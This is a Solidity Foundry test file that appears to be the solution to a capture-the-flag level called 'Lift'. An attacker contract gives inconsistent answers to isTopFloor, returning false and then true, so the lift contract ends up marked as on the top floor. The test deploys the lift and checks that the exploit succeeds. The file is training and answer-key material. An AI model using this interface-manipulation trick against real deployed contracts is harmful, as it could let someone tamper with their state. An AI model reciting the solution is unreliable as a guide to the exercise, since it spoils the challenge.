// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

contract AttackLift is House {
    Lift public lift;
    bool public call = true;

    constructor(address liftA) {
        lift = Lift(liftA);
    }

    function isTopFloor(uint256) external override returns (bool){
        if (call) {
            call = false;
            return call;
        } 
        return true;
    }

    function attack() public {
        lift.goToFloor(5);
    }
}

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        AttackLift attack = new AttackLift(address(instance));

        attack.attack();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}